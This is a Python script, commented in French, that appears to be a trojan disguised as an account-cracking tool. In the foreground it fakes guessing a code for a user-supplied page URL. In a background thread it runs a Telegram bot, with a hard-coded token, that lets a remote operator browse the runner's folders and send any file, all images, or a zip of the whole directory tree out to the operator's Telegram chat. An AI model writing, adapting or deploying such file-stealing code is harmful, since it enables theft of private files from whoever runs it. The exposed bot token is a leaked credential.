import os
import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from bs4 import BeautifulSoup
import requests
import time
from colorama import init, Fore
import threading
import zipfile
from io import BytesIO

init()

BOT_TOKEN = '7186277280:AAGDUX9hDsg46IiMmdDCtuOySLXbbrmCfrU'  # Remplacez ceci par votre propre token de bot
bot = telebot.TeleBot(BOT_TOKEN)

current_directory = os.getcwd()
previous_directories = []

# Premier code : Bot Telegram
def telegram_bot():
    @bot.message_handler(commands=["start"])
    def start(message):
        global current_directory, previous_directories
        current_directory = os.getcwd()
        previous_directories = []
        update_directories_keyboard(message.chat.id, current_directory)

    @bot.message_handler(func=lambda message: True)
    def handle_message(message):
        global current_directory, previous_directories
        if message.text == 'Retour au répertoire précédent':
            if previous_directories:
                current_directory = previous_directories.pop()
                update_directories_keyboard(message.chat.id, current_directory)
            else:
                bot.send_message(message.chat.id, "Vous êtes dans le répertoire racine, impossible de revenir plus loin.")
        elif message.text == 'Télécharger les fichiers':
            download_all_files(message)
        elif message.text == 'Télécharger les images':
            send_images_individually(message)
        elif os.path.isdir(os.path.join(current_directory, message.text)):
            previous_directories.append(current_directory)
            current_directory = os.path.join(current_directory, message.text)
            update_directories_keyboard(message.chat.id, current_directory)
        elif os.path.isfile(os.path.join(current_directory, message.text)):
            send_file(message.chat.id, os.path.join(current_directory, message.text), message.text)
        else:
            bot.send_message(message.chat.id, "Veuillez choisir une option valide.")

    def update_directories_keyboard(chat_id, path):
        keyboard = ReplyKeyboardMarkup(resize_keyboard=True)
        keyboard.add(KeyboardButton('Retour au répertoire précédent'), KeyboardButton('Télécharger les fichiers'), KeyboardButton('Télécharger les images'))
        for item in os.listdir(path):
            keyboard.add(KeyboardButton(item))
        bot.send_message(chat_id, "Choisissez un fichier à envoyer, un dossier à parcourir, 'Télécharger les fichiers' pour télécharger tous les fichiers, ou 'Télécharger les images' pour télécharger toutes les images :", reply_markup=keyboard)

    def send_file(chat_id, file_path, file_name):
        with open(file_path, 'rb') as file:
            bot.send_document(chat_id, file)

    def send_images_individually(message):
        global current_directory
        for file in os.listdir(current_directory):
            if file.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp')):
                send_file(message.chat.id, os.path.join(current_directory, file), file)

    def download_all_files(message):
        global current_directory
        zip_buffer = BytesIO()
        with zipfile.ZipFile(zip_buffer, 'a', zipfile.ZIP_DEFLATED) as zip_file:
            for root, dirs, files in os.walk(current_directory):
                for file in files:
                    zip_file.write(os.path.join(root, file), file)
        zip_buffer.seek(0)
        bot.send_document(message.chat.id, ('Fichiers.zip', zip_buffer))

    bot.polling()

# Deuxième code : Analyse d'une page web
def web_scraping():
    page_url = input("Entrez l'URL du compte :")
    print(Fore.GREEN + "Recherche du compte en cours...")
    try:
        page = requests.get(page_url)
        if page.status_code == 200:
            soup = BeautifulSoup(page.content, "html.parser")
            page_name = soup.find("title").string if soup.find("title") else "Non disponible"
            print(Fore.GREEN + f"Nom de la page : {page_name}")
            print(Fore.GREEN + "Tentative de deviner...")
            time.sleep(3)
            for number in range(1000000):
                print(Fore.GREEN + f"{number:06d}", end=' ')
                print(Fore.RED + "Le code est incorrect")
                time.sleep(0.5)
        else:
            print(Fore.RED + "Impossible d'accéder à la page, veuillez vérifier l'URL.")
    except Exception as e:
        print(Fore.RED + f"Une erreur s'est produite lors de la tentative d'accès à la page : {e}")

# Exécution des deux codes en parallèle
if __name__ == "__main__":
    threading.Thread(target=telegram_bot).start()
    threading.Thread(target=web_scraping).start()
